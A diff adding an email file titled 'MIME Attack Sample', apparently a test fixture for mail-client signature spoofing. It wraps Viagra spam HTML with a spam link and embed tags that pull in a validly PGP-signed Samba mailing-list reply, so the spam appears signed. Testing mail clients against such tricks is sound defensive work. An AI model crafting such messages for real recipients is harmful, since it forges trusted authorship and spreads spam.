@@ -1,0 +1,73 @@
+From: wayne.herndon@enron.com
+To: jeff.westover@enron.com, sherry.anastas@enron.com, bryce.baxter@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<html>
+<body bgcolor="#ffffff">
+<div style="border-color: #00FFFF; border-right-width: 0px; border-bottom-width: 0px; margin-bottom: 0px;" align="center">
+<table style="border: 2px; border-style: solid; border-color:#000000; font-family: Tahoma; font-weight: bold;" cellpadding="15" cellspacing="0" bgcolor="#FF0000">
+<tr><td style="color:yellow" align=center>
+Do you have any problem in getting <span>erec</span>tion??<br>Is age taking its toll on you?<br>
+</td>
+</tr>
+<tr>
+
+<td bgcolor=#AAEEEE align=center>
+<a href='http://passajedey.net/?23564288'>Try <span>V</span><span>I@<span></span>GR<span>@</span>.....It is fabulous.</a><br>
+</td></tr>
+<tr><td style="color:yellow" align=center>
+You surely like being in your 20s again and also wish if you had tried it.<br>
+</td></tr></table>
+</div></body></html>
+
+
+----493951548169006--
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+idra@samba.org wrote:
+> Author: idra
+> Date: 2007-04-12 21:10:06 +0000 (Thu, 12 Apr 2007)
+> New Revision: 22204
+> 
+> WebSVN: http://websvn.samba.org/cgi-bin/viewcvs.cgi?view=rev&root=samba&rev=22204
+> 
+> Log:
+> 
+> Workaround to quickly close bug #4508
+> This hack makes thing work, but we will need to try again to
+> make the getpw* calls fully async, that's the real fix.
+
+Wow!  This is really awful.  Is there no other way to fix this ?
+
+
+
+
+jerry
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.3 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGHqpsIR7qMdg1EfYRArD1AKDvTCMXTy8bTMIbFs0/Q9vCKQQHQQCgo6IE
+/SvHEEvfw9qpNanL4f9EXN4=
+=Ftrz
+-----END PGP SIGNATURE-----
+
+
+--BOUNDARY--
+--DELIMITER--
